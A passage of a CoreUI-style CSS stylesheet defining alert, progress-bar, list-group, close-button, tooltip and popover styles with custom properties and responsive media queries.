                --cui-alert-border-color: #f9fafa;
            }
            .alert-light .alert-link {
                color: rgba(99, 105, 114, 0.976);
            }
            .alert-dark {
                --cui-alert-color: #2f3845;
                --cui-alert-bg: #dcdfe3;
                --cui-alert-border-color: #caced5;
            }
            .alert-dark .alert-link {
                color: #262d37;
            }
            @keyframes progress-bar-stripes {
                0% {
                    background-position-x: 1rem;
                }
            }
            .progress {
                --cui-progress-height: 1rem;
                --cui-progress-font-size: 0.75rem;
                --cui-progress-bg: #d8dbe0;
                --cui-progress-border-radius: 0.375rem;
                --cui-progress-box-shadow: inset 0 1px 2px rgba(0, 0, 21, 0.075);
                --cui-progress-bar-color: rgba(255, 255, 255, 0.87);
                --cui-progress-bar-bg: #321fdb;
                --cui-progress-bar-transition: width 0.6s ease;
                display: flex;
                height: var(--cui-progress-height);
                overflow: hidden;
                font-size: var(--cui-progress-font-size);
                background-color: var(--cui-progress-bg);
                border-radius: var(--cui-progress-border-radius);
            }
            .progress-bar {
                display: flex;
                flex-direction: column;
                justify-content: center;
                overflow: hidden;
                color: var(--cui-progress-bar-color);
                text-align: center;
                white-space: nowrap;
                background-color: var(--cui-progress-bar-bg);
                transition: var(--cui-progress-bar-transition);
            }
            @media (prefers-reduced-motion: reduce) {
                .progress-bar {
                    transition: none;
                }
            }
            .progress-bar-striped {
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-size: var(--cui-progress-height) var(--cui-progress-height);
            }
            .progress-bar-animated {
                animation: 1s linear infinite progress-bar-stripes;
            }
            @media (prefers-reduced-motion: reduce) {
                .progress-bar-animated {
                    animation: none;
                }
            }
            .progress-thin {
                height: 4px;
            }
            .progress.progress-white {
                background-color: rgba(255, 255, 255, 0.2);
            }
            .progress.progress-white .progress-bar {
                background-color: #fff;
            }
            .progress-group {
                display: flex;
                flex-flow: row wrap;
                margin-bottom: 1rem;
            }
            .progress-group-prepend {
                flex: 0 0 100px;
                align-self: center;
            }
            .progress-group-header {
                display: flex;
                flex-basis: 100%;
                align-items: center;
                margin-bottom: 0.25rem;
            }
            .progress-group-bars {
                flex-grow: 1;
                align-self: center;
            }
            .progress-group-bars .progress:not(:last-child) {
                margin-bottom: 2px;
            }
            .progress-group-header + .progress-group-bars {
                flex-basis: 100%;
            }
            .list-group {
                --cui-list-group-color: unset;
                --cui-list-group-bg: #fff;
                --cui-list-group-border-color: rgba(0, 0, 21, 0.125);
                --cui-list-group-border-width: 1px;
                --cui-list-group-border-radius: 0.375rem;
                --cui-list-group-item-padding-x: 1rem;
                --cui-list-group-item-padding-y: 0.5rem;
                --cui-list-group-action-color: #768192;
                --cui-list-group-action-hover-color: #768192;
                --cui-list-group-action-hover-bg: #ebedef;
                --cui-list-group-action-active-color: rgba(44, 56, 74, 0.95);
                --cui-list-group-action-active-bg: #d8dbe0;
                --cui-list-group-disabled-color: #8a93a2;
                --cui-list-group-disabled-bg: #fff;
                --cui-list-group-active-color: rgba(255, 255, 255, 0.87);
                --cui-list-group-active-bg: #321fdb;
                --cui-list-group-active-border-color: #321fdb;
                display: flex;
                flex-direction: column;
                margin-bottom: 0;
                border-radius: var(--cui-list-group-border-radius);
            }
            html:not([dir="rtl"]) .list-group {
                padding-left: 0;
            }
            *[dir="rtl"] .list-group {
                padding-right: 0;
            }
            .list-group-numbered {
                list-style-type: none;
                counter-reset: section;
            }
            .list-group-numbered > .list-group-item::before {
                content: counters(section, ".") ". ";
                counter-increment: section;
            }
            .list-group-item-action {
                width: 100%;
                color: var(--cui-list-group-action-color);
                text-align: inherit;
            }
            .list-group-item-action:hover,
            .list-group-item-action:focus {
                z-index: 1;
                color: var(--cui-list-group-action-hover-color);
                text-decoration: none;
                background-color: var(--cui-list-group-action-hover-bg);
            }
            .list-group-item-action:active {
                color: var(--cui-list-group-action-active-color);
                background-color: var(--cui-list-group-action-active-bg);
            }
            .list-group-item {
                position: relative;
                display: block;
                padding: var(--cui-list-group-item-padding-y) var(--cui-list-group-item-padding-x);
                color: var(--cui-list-group-color);
                text-decoration: none;
                background-color: var(--cui-list-group-bg);
                border: var(--cui-list-group-border-width) solid var(--cui-list-group-border-color);
            }
            .list-group-item:first-child {
                border-top-left-radius: inherit;
                border-top-right-radius: inherit;
            }
            .list-group-item:last-child {
                border-bottom-right-radius: inherit;
                border-bottom-left-radius: inherit;
            }
            .list-group-item.disabled,
            .list-group-item:disabled {
                color: var(--cui-list-group-disabled-color);
                pointer-events: none;
                background-color: var(--cui-list-group-disabled-bg);
            }
            .list-group-item.active {
                z-index: 2;
                color: var(--cui-list-group-active-color);
                background-color: var(--cui-list-group-active-bg);
                border-color: var(--cui-list-group-active-border-color);
            }
            .list-group-item + .list-group-item {
                border-top-width: 0;
            }
            .list-group-item + .list-group-item.active {
                margin-top: calc(-1 * var(--cui-list-group-border-width));
                border-top-width: var(--cui-list-group-border-width);
            }
            .list-group-horizontal {
                flex-direction: row;
            }
            html:not([dir="rtl"]) .list-group-horizontal > .list-group-item:first-child:not(:last-child) {
                border-bottom-left-radius: var(--cui-list-group-border-radius);
                border-top-right-radius: 0;
            }
            *[dir="rtl"] .list-group-horizontal > .list-group-item:first-child:not(:last-child) {
                border-bottom-right-radius: var(--cui-list-group-border-radius);
                border-top-left-radius: 0;
            }
            html:not([dir="rtl"]) .list-group-horizontal > .list-group-item:last-child:not(:first-child) {
                border-top-right-radius: var(--cui-list-group-border-radius);
                border-bottom-left-radius: 0;
            }
            *[dir="rtl"] .list-group-horizontal > .list-group-item:last-child:not(:first-child) {
                border-top-left-radius: var(--cui-list-group-border-radius);
                border-bottom-right-radius: 0;
            }
            .list-group-horizontal > .list-group-item.active {
                margin-top: 0;
            }
            .list-group-horizontal > .list-group-item + .list-group-item {
                border-top-width: var(--cui-list-group-border-width);
            }
            html:not([dir="rtl"]) .list-group-horizontal > .list-group-item + .list-group-item {
                border-left-width: 0;
            }
            *[dir="rtl"] .list-group-horizontal > .list-group-item + .list-group-item {
                border-right-width: 0;
            }
            html:not([dir="rtl"]) .list-group-horizontal > .list-group-item + .list-group-item.active {
                margin-left: calc(-1 * var(--cui-list-group-border-width));
                border-left-width: var(--cui-list-group-border-width);
            }
            *[dir="rtl"] .list-group-horizontal > .list-group-item + .list-group-item.active {
                margin-right: calc(-1 * var(--cui-list-group-border-width));
                border-right-width: var(--cui-list-group-border-width);
            }
            @media (min-width: 576px) {
                .list-group-horizontal-sm {
                    flex-direction: row;
                }
                html:not([dir="rtl"]) .list-group-horizontal-sm > .list-group-item:first-child:not(:last-child) {
                    border-bottom-left-radius: var(--cui-list-group-border-radius);
                    border-top-right-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-sm > .list-group-item:first-child:not(:last-child) {
                    border-bottom-right-radius: var(--cui-list-group-border-radius);
                    border-top-left-radius: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-sm > .list-group-item:last-child:not(:first-child) {
                    border-top-right-radius: var(--cui-list-group-border-radius);
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-sm > .list-group-item:last-child:not(:first-child) {
                    border-top-left-radius: var(--cui-list-group-border-radius);
                    border-bottom-right-radius: 0;
                }
                .list-group-horizontal-sm > .list-group-item.active {
                    margin-top: 0;
                }
                .list-group-horizontal-sm > .list-group-item + .list-group-item {
                    border-top-width: var(--cui-list-group-border-width);
                }
                html:not([dir="rtl"]) .list-group-horizontal-sm > .list-group-item + .list-group-item {
                    border-left-width: 0;
                }
                *[dir="rtl"] .list-group-horizontal-sm > .list-group-item + .list-group-item {
                    border-right-width: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-sm > .list-group-item + .list-group-item.active {
                    margin-left: calc(-1 * var(--cui-list-group-border-width));
                    border-left-width: var(--cui-list-group-border-width);
                }
                *[dir="rtl"] .list-group-horizontal-sm > .list-group-item + .list-group-item.active {
                    margin-right: calc(-1 * var(--cui-list-group-border-width));
                    border-right-width: var(--cui-list-group-border-width);
                }
            }
            @media (min-width: 768px) {
                .list-group-horizontal-md {
                    flex-direction: row;
                }
                html:not([dir="rtl"]) .list-group-horizontal-md > .list-group-item:first-child:not(:last-child) {
                    border-bottom-left-radius: var(--cui-list-group-border-radius);
                    border-top-right-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-md > .list-group-item:first-child:not(:last-child) {
                    border-bottom-right-radius: var(--cui-list-group-border-radius);
                    border-top-left-radius: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-md > .list-group-item:last-child:not(:first-child) {
                    border-top-right-radius: var(--cui-list-group-border-radius);
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-md > .list-group-item:last-child:not(:first-child) {
                    border-top-left-radius: var(--cui-list-group-border-radius);
                    border-bottom-right-radius: 0;
                }
                .list-group-horizontal-md > .list-group-item.active {
                    margin-top: 0;
                }
                .list-group-horizontal-md > .list-group-item + .list-group-item {
                    border-top-width: var(--cui-list-group-border-width);
                }
                html:not([dir="rtl"]) .list-group-horizontal-md > .list-group-item + .list-group-item {
                    border-left-width: 0;
                }
                *[dir="rtl"] .list-group-horizontal-md > .list-group-item + .list-group-item {
                    border-right-width: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-md > .list-group-item + .list-group-item.active {
                    margin-left: calc(-1 * var(--cui-list-group-border-width));
                    border-left-width: var(--cui-list-group-border-width);
                }
                *[dir="rtl"] .list-group-horizontal-md > .list-group-item + .list-group-item.active {
                    margin-right: calc(-1 * var(--cui-list-group-border-width));
                    border-right-width: var(--cui-list-group-border-width);
                }
            }
            @media (min-width: 992px) {
                .list-group-horizontal-lg {
                    flex-direction: row;
                }
                html:not([dir="rtl"]) .list-group-horizontal-lg > .list-group-item:first-child:not(:last-child) {
                    border-bottom-left-radius: var(--cui-list-group-border-radius);
                    border-top-right-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-lg > .list-group-item:first-child:not(:last-child) {
                    border-bottom-right-radius: var(--cui-list-group-border-radius);
                    border-top-left-radius: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-lg > .list-group-item:last-child:not(:first-child) {
                    border-top-right-radius: var(--cui-list-group-border-radius);
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-lg > .list-group-item:last-child:not(:first-child) {
                    border-top-left-radius: var(--cui-list-group-border-radius);
                    border-bottom-right-radius: 0;
                }
                .list-group-horizontal-lg > .list-group-item.active {
                    margin-top: 0;
                }
                .list-group-horizontal-lg > .list-group-item + .list-group-item {
                    border-top-width: var(--cui-list-group-border-width);
                }
                html:not([dir="rtl"]) .list-group-horizontal-lg > .list-group-item + .list-group-item {
                    border-left-width: 0;
                }
                *[dir="rtl"] .list-group-horizontal-lg > .list-group-item + .list-group-item {
                    border-right-width: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-lg > .list-group-item + .list-group-item.active {
                    margin-left: calc(-1 * var(--cui-list-group-border-width));
                    border-left-width: var(--cui-list-group-border-width);
                }
                *[dir="rtl"] .list-group-horizontal-lg > .list-group-item + .list-group-item.active {
                    margin-right: calc(-1 * var(--cui-list-group-border-width));
                    border-right-width: var(--cui-list-group-border-width);
                }
            }
            @media (min-width: 1200px) {
                .list-group-horizontal-xl {
                    flex-direction: row;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xl > .list-group-item:first-child:not(:last-child) {
                    border-bottom-left-radius: var(--cui-list-group-border-radius);
                    border-top-right-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xl > .list-group-item:first-child:not(:last-child) {
                    border-bottom-right-radius: var(--cui-list-group-border-radius);
                    border-top-left-radius: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xl > .list-group-item:last-child:not(:first-child) {
                    border-top-right-radius: var(--cui-list-group-border-radius);
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xl > .list-group-item:last-child:not(:first-child) {
                    border-top-left-radius: var(--cui-list-group-border-radius);
                    border-bottom-right-radius: 0;
                }
                .list-group-horizontal-xl > .list-group-item.active {
                    margin-top: 0;
                }
                .list-group-horizontal-xl > .list-group-item + .list-group-item {
                    border-top-width: var(--cui-list-group-border-width);
                }
                html:not([dir="rtl"]) .list-group-horizontal-xl > .list-group-item + .list-group-item {
                    border-left-width: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xl > .list-group-item + .list-group-item {
                    border-right-width: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xl > .list-group-item + .list-group-item.active {
                    margin-left: calc(-1 * var(--cui-list-group-border-width));
                    border-left-width: var(--cui-list-group-border-width);
                }
                *[dir="rtl"] .list-group-horizontal-xl > .list-group-item + .list-group-item.active {
                    margin-right: calc(-1 * var(--cui-list-group-border-width));
                    border-right-width: var(--cui-list-group-border-width);
                }
            }
            @media (min-width: 1400px) {
                .list-group-horizontal-xxl {
                    flex-direction: row;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xxl > .list-group-item:first-child:not(:last-child) {
                    border-bottom-left-radius: var(--cui-list-group-border-radius);
                    border-top-right-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xxl > .list-group-item:first-child:not(:last-child) {
                    border-bottom-right-radius: var(--cui-list-group-border-radius);
                    border-top-left-radius: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xxl > .list-group-item:last-child:not(:first-child) {
                    border-top-right-radius: var(--cui-list-group-border-radius);
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xxl > .list-group-item:last-child:not(:first-child) {
                    border-top-left-radius: var(--cui-list-group-border-radius);
                    border-bottom-right-radius: 0;
                }
                .list-group-horizontal-xxl > .list-group-item.active {
                    margin-top: 0;
                }
                .list-group-horizontal-xxl > .list-group-item + .list-group-item {
                    border-top-width: var(--cui-list-group-border-width);
                }
                html:not([dir="rtl"]) .list-group-horizontal-xxl > .list-group-item + .list-group-item {
                    border-left-width: 0;
                }
                *[dir="rtl"] .list-group-horizontal-xxl > .list-group-item + .list-group-item {
                    border-right-width: 0;
                }
                html:not([dir="rtl"]) .list-group-horizontal-xxl > .list-group-item + .list-group-item.active {
                    margin-left: calc(-1 * var(--cui-list-group-border-width));
                    border-left-width: var(--cui-list-group-border-width);
                }
                *[dir="rtl"] .list-group-horizontal-xxl > .list-group-item + .list-group-item.active {
                    margin-right: calc(-1 * var(--cui-list-group-border-width));
                    border-right-width: var(--cui-list-group-border-width);
                }
            }
            .list-group-flush {
                border-radius: 0;
            }
            .list-group-flush > .list-group-item {
                border-width: 0 0 var(--cui-list-group-border-width);
            }
            .list-group-flush > .list-group-item:last-child {
                border-bottom-width: 0;
            }
            .list-group-item-primary {
                --cui-list-group-color: contrast-ratio-correction(#1e1383, #d6d2f8, 40%, "primary");
                --cui-list-group-bg: #d6d2f8;
                --cui-list-group-hover-bg: #2d1cc5;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#1e1383, #d6d2f8, 40%, "primary");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#1e1383, #d6d2f8, 40%, "primary");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#1e1383, #d6d2f8, 40%, "primary");
            }
            .list-group-item-secondary {
                --cui-list-group-color: contrast-ratio-correction(#5e636a, #ebedef, 40%, "secondary");
                --cui-list-group-bg: #ebedef;
                --cui-list-group-hover-bg: #8d959f;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#5e636a, #ebedef, 40%, "secondary");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#5e636a, #ebedef, 40%, "secondary");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#5e636a, #ebedef, 40%, "secondary");
            }
            .list-group-item-success {
                --cui-list-group-color: contrast-ratio-correction(#1c6e37, #d5f1de, 40%, "success");
                --cui-list-group-bg: #d5f1de;
                --cui-list-group-hover-bg: #29a653;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#1c6e37, #d5f1de, 40%, "success");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#1c6e37, #d5f1de, 40%, "success");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#1c6e37, #d5f1de, 40%, "success");
            }
            .list-group-item-danger {
                --cui-list-group-color: contrast-ratio-correction(#893232, #fadddd, 40%, "danger");
                --cui-list-group-bg: #fadddd;
                --cui-list-group-hover-bg: #ce4b4b;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#893232, #fadddd, 40%, "danger");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#893232, #fadddd, 40%, "danger");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#893232, #fadddd, 40%, "danger");
            }
            .list-group-item-warning {
                --cui-list-group-color: contrast-ratio-correction(#956a0d, #feefd0, 40%, "warning");
                --cui-list-group-bg: #feefd0;
                --cui-list-group-hover-bg: #e09f13;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#956a0d, #feefd0, 40%, "warning");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#956a0d, #feefd0, 40%, "warning");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#956a0d, #feefd0, 40%, "warning");
            }
            .list-group-item-info {
                --cui-list-group-color: contrast-ratio-correction(#1f5c99, #d6ebff, 40%, "info");
                --cui-list-group-bg: #d6ebff;
                --cui-list-group-hover-bg: #2e8ae6;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#1f5c99, #d6ebff, 40%, "info");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#1f5c99, #d6ebff, 40%, "info");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#1f5c99, #d6ebff, 40%, "info");
            }
            .list-group-item-light {
                --cui-list-group-color: contrast-ratio-correction(#8d8e8f, #fbfbfc, 40%, "light");
                --cui-list-group-bg: #fbfbfc;
                --cui-list-group-hover-bg: #d4d5d7;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#8d8e8f, #fbfbfc, 40%, "light");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#8d8e8f, #fbfbfc, 40%, "light");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#8d8e8f, #fbfbfc, 40%, "light");
            }
            .list-group-item-dark {
                --cui-list-group-color: contrast-ratio-correction(#2f3845, #dcdfe3, 40%, "dark");
                --cui-list-group-bg: #dcdfe3;
                --cui-list-group-hover-bg: #475468;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#2f3845, #dcdfe3, 40%, "dark");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#2f3845, #dcdfe3, 40%, "dark");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#2f3845, #dcdfe3, 40%, "dark");
            }

            .btn-close:hover {
                color: var(--cui-btn-close-color, rgba(44, 56, 74, 0.95));
                text-decoration: none;
                opacity: 0.75;
            }
            .btn-close:focus {
                outline: 0;
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
                opacity: 1;
            }
            .btn-close:disabled,
            .btn-close.disabled {
                pointer-events: none;
                -webkit-user-select: none;
                -moz-user-select: none;
                user-select: none;
                opacity: 0.25;
            }
            .btn-close-white {
                filter: invert(1) grayscale(100%) brightness(200%);
            }

            html:not([dir="rtl"]) .toast-header .btn-close {
                margin-right: calc(-0.5 * var(--cui-toast-padding-x));
                margin-left: var(--cui-toast-padding-x);
            }
            *[dir="rtl"] .toast-header .btn-close {
                margin-left: calc(-0.5 * var(--cui-toast-padding-x));
                margin-right: var(--cui-toast-padding-x);
            }

            .tooltip {
                --cui-tooltip-zindex: 1080;
                --cui-tooltip-max-width: 200px;
                --cui-tooltip-padding-x: 0.5rem;
                --cui-tooltip-padding-y: 0.25rem;
                --cui-tooltip-margin: ;
                --cui-tooltip-font-size: 0.875rem;
                --cui-tooltip-color: rgba(255, 255, 255, 0.87);
                --cui-tooltip-bg: #000015;
                --cui-tooltip-border-radius: 0.375rem;
                --cui-tooltip-opacity: 0.9;
                --cui-tooltip-arrow-width: 0.8rem;
                --cui-tooltip-arrow-height: 0.4rem;
                z-index: var(--cui-tooltip-zindex);
                display: block;
                padding: var(--cui-tooltip-arrow-height);
                margin: var(--cui-tooltip-margin);
                font-family: var(--cui-font-sans-serif);
                font-style: normal;
                font-weight: 400;
                line-height: 1.5;
                text-align: left;
                text-align: start;
                text-decoration: none;
                text-shadow: none;
                text-transform: none;
                letter-spacing: normal;
                word-break: normal;
                white-space: normal;
                word-spacing: normal;
                line-break: auto;
                font-size: var(--cui-tooltip-font-size);
                word-wrap: break-word;
                opacity: 0;
            }
            .tooltip.show {
                opacity: var(--cui-tooltip-opacity);
            }
            .tooltip .tooltip-arrow {
                display: block;
                width: var(--cui-tooltip-arrow-width);
                height: var(--cui-tooltip-arrow-height);
            }
            .tooltip .tooltip-arrow::before {
                position: absolute;
                content: "";
                border-color: transparent;
                border-style: solid;
            }
            .bs-tooltip-top .tooltip-arrow,
            .bs-tooltip-auto[data-popper-placement^="top"] .tooltip-arrow {
                bottom: 0;
            }
            .bs-tooltip-top .tooltip-arrow::before,
            .bs-tooltip-auto[data-popper-placement^="top"] .tooltip-arrow::before {
                top: -1px;
                border-width: var(--cui-tooltip-arrow-height) calc(var(--cui-tooltip-arrow-width) * 0.5) 0;
                border-top-color: var(--cui-tooltip-bg);
            }
            .bs-tooltip-end .tooltip-arrow,
            .bs-tooltip-auto[data-popper-placement^="right"] .tooltip-arrow {
                left: 0;
                width: var(--cui-tooltip-arrow-height);
                height: var(--cui-tooltip-arrow-width);
            }
            .bs-tooltip-end .tooltip-arrow::before,
            .bs-tooltip-auto[data-popper-placement^="right"] .tooltip-arrow::before {
                right: -1px;
                border-width: calc(var(--cui-tooltip-arrow-width) * 0.5) var(--cui-tooltip-arrow-height) calc(var(--cui-tooltip-arrow-width) * 0.5) 0;
                border-right-color: var(--cui-tooltip-bg);
            }
            .bs-tooltip-bottom .tooltip-arrow,
            .bs-tooltip-auto[data-popper-placement^="bottom"] .tooltip-arrow {
                top: 0;
            }
            .bs-tooltip-bottom .tooltip-arrow::before,
            .bs-tooltip-auto[data-popper-placement^="bottom"] .tooltip-arrow::before {
                bottom: -1px;
                border-width: 0 calc(var(--cui-tooltip-arrow-width) * 0.5) var(--cui-tooltip-arrow-height);
                border-bottom-color: var(--cui-tooltip-bg);
            }
            .bs-tooltip-start .tooltip-arrow,
            .bs-tooltip-auto[data-popper-placement^="left"] .tooltip-arrow {
                right: 0;
                width: var(--cui-tooltip-arrow-height);
                height: var(--cui-tooltip-arrow-width);
            }
            .bs-tooltip-start .tooltip-arrow::before,
            .bs-tooltip-auto[data-popper-placement^="left"] .tooltip-arrow::before {
                left: -1px;
                border-width: calc(var(--cui-tooltip-arrow-width) * 0.5) 0 calc(var(--cui-tooltip-arrow-width) * 0.5) var(--cui-tooltip-arrow-height);
                border-left-color: var(--cui-tooltip-bg);
            }
            .tooltip-inner {
                max-width: var(--cui-tooltip-max-width);
                padding: var(--cui-tooltip-padding-y) var(--cui-tooltip-padding-x);
                color: var(--cui-tooltip-color);
                text-align: center;
                background-color: var(--cui-tooltip-bg);
                border-radius: var(--cui-tooltip-border-radius, 0);
            }
            .popover {
                --cui-popover-zindex: 1070;
                --cui-popover-max-width: 276px;
                --cui-popover-font-size: 0.875rem;
                --cui-popover-bg: #fff;
                --cui-popover-border-width: 1px;
                --cui-popover-border-color: var(--cui-border-color-translucent);
                --cui-popover-border-radius: 0.5rem;
                --cui-popover-inner-border-radius: calc(0.5rem - 1px);
                --cui-popover-box-shadow: 0 0.5rem 1rem rgba(0, 0, 21, 0.15);
                --cui-popover-header-padding-x: 1rem;
                --cui-popover-header-padding-y: 0.5rem;
                --cui-popover-header-font-size: 1rem;
                --cui-popover-header-color: unset;
                --cui-popover-header-bg: #f0f0f0;
                --cui-popover-body-padding-x: 1rem;
                --cui-popover-body-padding-y: 1rem;
                --cui-popover-body-color: rgba(44, 56, 74, 0.95);
                --cui-popover-arrow-width: 1rem;
                --cui-popover-arrow-height: 0.5rem;
                --cui-popover-arrow-border: var(--cui-popover-border-color);
                z-index: var(--cui-popover-zindex);
                display: block;
                max-width: var(--cui-popover-max-width);
                font-family: var(--cui-font-sans-serif);
                font-style: normal;
                font-weight: 400;
                line-height: 1.5;
                text-align: left;
                text-align: start;
                text-decoration: none;
                text-shadow: none;
                text-transform: none;
                letter-spacing: normal;
                word-break: normal;
                white-space: normal;
                word-spacing: normal;
                line-break: auto;
                font-size: var(--cui-popover-font-size);
                word-wrap: break-word;
                background-color: var(--cui-popover-bg);
                background-clip: padding-box;
                border: var(--cui-popover-border-width) solid var(--cui-popover-border-color);
                border-radius: var(--cui-popover-border-radius);
            }
            .popover .popover-arrow {
                display: block;
                width: var(--cui-popover-arrow-width);
                height: var(--cui-popover-arrow-height);
            }
            .popover .popover-arrow::before,
            .popover .popover-arrow::after {
                position: absolute;
                display: block;
                content: "";
                border-color: transparent;
                border-style: solid;
                border-width: 0;
            }
            .bs-popover-top > .popover-arrow,
            .bs-popover-auto[data-popper-placement^="top"] > .popover-arrow {
                bottom: calc(-1 * (var(--cui-popover-arrow-height)) - var(--cui-popover-border-width));
            }
            .bs-popover-top > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="top"] > .popover-arrow::before,
            .bs-popover-top > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="top"] > .popover-arrow::after {
                border-width: var(--cui-popover-arrow-height) calc(var(--cui-popover-arrow-width) * 0.5) 0;
            }
            .bs-popover-top > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="top"] > .popover-arrow::before {
                bottom: 0;
                border-top-color: var(--cui-popover-arrow-border);
            }
            .bs-popover-top > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="top"] > .popover-arrow::after {
                bottom: var(--cui-popover-border-width);
                border-top-color: var(--cui-popover-bg);
            }
            .bs-popover-end > .popover-arrow,
            .bs-popover-auto[data-popper-placement^="right"] > .popover-arrow {
                left: calc(-1 * (var(--cui-popover-arrow-height)) - var(--cui-popover-border-width));
                width: var(--cui-popover-arrow-height);
                height: var(--cui-popover-arrow-width);
            }
            .bs-popover-end > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="right"] > .popover-arrow::before,
            .bs-popover-end > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="right"] > .popover-arrow::after {
                border-width: calc(var(--cui-popover-arrow-width) * 0.5) var(--cui-popover-arrow-height) calc(var(--cui-popover-arrow-width) * 0.5) 0;
            }
            .bs-popover-end > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="right"] > .popover-arrow::before {
                left: 0;
                border-right-color: var(--cui-popover-arrow-border);
            }
            .bs-popover-end > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="right"] > .popover-arrow::after {
                left: var(--cui-popover-border-width);
                border-right-color: var(--cui-popover-bg);
            }
            .bs-popover-bottom > .popover-arrow,
            .bs-popover-auto[data-popper-placement^="bottom"] > .popover-arrow {
                top: calc(-1 * (var(--cui-popover-arrow-height)) - var(--cui-popover-border-width));
            }
            .bs-popover-bottom > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="bottom"] > .popover-arrow::before,
            .bs-popover-bottom > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="bottom"] > .popover-arrow::after {
                border-width: 0 calc(var(--cui-popover-arrow-width) * 0.5) var(--cui-popover-arrow-height);
            }
            .bs-popover-bottom > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="bottom"] > .popover-arrow::before {
                top: 0;
                border-bottom-color: var(--cui-popover-arrow-border);
            }
            .bs-popover-bottom > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="bottom"] > .popover-arrow::after {
                top: var(--cui-popover-border-width);
                border-bottom-color: var(--cui-popover-bg);
            }
            .bs-popover-bottom .popover-header::before,
            .bs-popover-auto[data-popper-placement^="bottom"] .popover-header::before {
                position: absolute;
                top: 0;
                left: 50%;
                display: block;
                width: var(--cui-popover-arrow-width);
                margin-left: calc(-0.5 * var(--cui-popover-arrow-width));
                content: "";
                border-bottom: var(--cui-popover-border-width) solid var(--cui-popover-header-bg);
            }
            .bs-popover-start > .popover-arrow,
            .bs-popover-auto[data-popper-placement^="left"] > .popover-arrow {
                right: calc(-1 * (var(--cui-popover-arrow-height)) - var(--cui-popover-border-width));
                width: var(--cui-popover-arrow-height);
                height: var(--cui-popover-arrow-width);
            }
            .bs-popover-start > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="left"] > .popover-arrow::before,
            .bs-popover-start > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="left"] > .popover-arrow::after {
                border-width: calc(var(--cui-popover-arrow-width) * 0.5) 0 calc(var(--cui-popover-arrow-width) * 0.5) var(--cui-popover-arrow-height);
            }
            .bs-popover-start > .popover-arrow::before,
            .bs-popover-auto[data-popper-placement^="left"] > .popover-arrow::before {
                right: 0;
                border-left-color: var(--cui-popover-arrow-border);
            }
            .bs-popover-start > .popover-arrow::after,
            .bs-popover-auto[data-popper-placement^="left"] > .popover-arrow::after {
                right: var(--cui-popover-border-width);
                border-left-color: var(--cui-popover-bg);
            }
            .popover-header {
                padding: var(--cui-popover-header-padding-y) var(--cui-popover-header-padding-x);
                margin-bottom: 0;
                font-size: var(--cui-popover-header-font-size);
                color: var(--cui-popover-header-color);
                background-color: var(--cui-popover-header-bg);
